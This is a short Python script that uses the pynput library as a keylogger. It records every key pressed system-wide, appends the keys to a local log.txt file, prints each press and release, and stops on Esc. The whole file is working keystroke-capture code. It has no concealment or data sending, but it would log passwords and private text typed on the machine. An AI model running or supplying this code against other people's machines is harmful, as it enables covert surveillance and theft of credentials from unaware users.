from pynput.keyboard import Key, Listener

keys = []  # Store pressed keys

def on_press(key):
    """Handles key press events."""
    keys.append(key)
    write_file(keys)

    try:
        print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')

def write_file(keys):
    """Writes keys to a log file."""
    with open('log.txt', 'a') as f:  # Use append mode to avoid overwriting
        for key in keys:
            k = str(key).replace("'", "")  # Format the key
            if k == "Key.space":  # Replace space key for readability
                f.write(" ")
            elif "Key" in k:  # Handle special keys
                f.write(f"[{k}]")
            else:
                f.write(k)
        keys.clear()  # Clear the list to avoid duplicate writing

def on_release(key):
    """Handles key release events."""
    print(f'{key} released')
    if key == Key.esc:
        # Stop the listener on ESC key press
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
